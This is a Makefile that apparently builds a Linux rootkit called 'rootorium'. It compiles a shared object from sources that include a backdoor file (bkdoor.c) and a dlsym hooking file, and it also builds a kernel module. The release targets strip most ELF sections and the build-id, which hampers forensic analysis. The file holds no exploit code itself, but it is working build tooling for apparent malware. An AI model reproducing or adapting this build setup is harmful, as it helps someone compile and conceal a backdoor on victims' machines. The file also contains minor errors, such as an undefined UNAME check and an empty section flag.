ARCH_INT := $(shell uname -m | sed 's/i686/32/; s/x86_64/64/')
#ARCH_STR := $(uname -r | sed -e 's/i386/common/' -e 's/amd64/common/')

all: product debug
	cd kern_mod && make
	cp kern_mod/rootorium.ko Release/
	cp kern_mod/rootorium.ko Debug/

ifeq ($(UNAME), i686)

product: rootorium.so.i686
debug: rootorium.so.i686.dbg

else

product: rootorium.so
debug: rootorium.so.dbg

endif

rootorium.so: src/rootorium.c
	mkdir -p Release/
	gcc -std=gnu99 -O3 -Wall -Wl,--build-id=none -pthread -ldl src/dlsym.c src/bkdoor.c src/misc.c src/rootorium.c -o Release/rootorium.so
	strip -S --strip-unneeded --remove-section=.jcr --remove-section=.got --remove-section=.data --remove-section=.bss --remove-section=.note.ABI-tag --remove-section=.eh_frame --remove-section=.eh_frame_hdr --remove-section=.gnu.version --remove-section=.rela.dyn --remove-section= --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id Release/rootorium.so

rootorium.so.i686: src/rootorium.c
	mkdir -p Release/
	gcc -m32 -std=gnu99 -O3 -Wall -Wl,--build-id=none -pthread -ldl src/dlsym.c src/bkdoor.c src/misc.c src/rootorium.c -o Release/rootorium.so.i686
	strip  -S --strip-unneeded --remove-section=.jcr --remove-section=.got --remove-section=.data --remove-section=.bss --remove-section=.note.ABI-tag --remove-section=.eh_frame --remove-section=.eh_frame_hdr --remove-section=.gnu.version --remove-section=.rela.dyn --remove-section= --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id Release/rootorium.so.i686

rootorium.so.dbg: src/rootorium.c
	mkdir -p Debug/
	gcc -std=gnu99 -g -DDEBUG -O0 -Wall -Wl,--build-id=none -pthread -ldl src/dlsym.c src/bkdoor.c src/misc.c src/rootorium.c -o Debug/rootorium.so.dbg

rootorium.so.i686.dbg: src/rootorium.c
	mkdir -p Debug/
	gcc -m32 -std=gnu99 -g -DDEBUG -O0 -Wall -Wl,--build-id=none -pthread -ldl src/dlsym.c src/bkdoor.c src/misc.c src/rootorium.c -o Debug/rootorium.so.i686.dbg

clean:
	cd kern_mod && make clean
	rm -f Release/*
	rm -f Debug/*
